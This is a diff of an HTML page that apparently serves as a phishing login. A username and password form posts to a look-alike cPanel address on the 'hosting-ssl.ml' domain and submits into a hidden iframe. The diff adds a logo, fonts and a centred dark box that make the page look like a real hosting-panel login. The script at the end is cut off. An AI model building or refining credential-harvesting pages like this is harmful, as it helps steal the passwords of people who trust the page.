@@ -1,5 +1,5 @@
-<div>
-	<img src="https://cdn.hosting-ssl.ml/image/logo.png">
+<div id="box">
+	<img id="logo" src="https://cdn.hosting-ssl.ml/image/logo.png">
 	<form id="LoginForm" action="https://cpanel.hosting-ssl.ml/login.php" method="post" target="frame">
 		<p><span>Username: </span><input type="text" name="uname" placeholder="username"></p>
 		<p><span>Password: </span><input type="password" name="passwd" placeholder="password"></p>
@@ -7,6 +7,47 @@
 		<input type="submit" value="Login">
 	</form>
 </div>
+<style>
+@font-face {
+  font-family: OpenBoldItalic;
+  src: url(./OpenSans-BoldItalic.ttf);
+}
+@font-face {
+  font-family: OpenRegular;
+  src: url(./OpenSans-Regular.ttf);
+}
+@font-face {
+  font-family: OpenBold;
+  src: url(./OpenSans-Bold.ttf);
+}
+@font-face {
+  font-family: OpenSemibold;
+  src: url(./OpenSans-Semibold.ttf);
+}
+#box {
+    background-color: #1D1D1D;
+    border-radius: 2px;
+    position: fixed;
+    width: 400px;
+    height: 200px;
+    left: 50%;
+    margin-left: -200px;
+    top: 50%;
+    margin-top: -100px;
+}
+#logo {
+	width: 48px;
+	height: 48px;
+	position: relative;
+	padding: 16px;
+}
+#LoginForm {
+    position: absolute;
+    top: 64px;
+    left: 64px;
+	color: #FFF;
+}
+</style>
 <iframe id="frame" name="frame" src="about:blank" style="visibility: hidden;"></iframe>
 <script>
 	var frame = document.getElementById("frame");
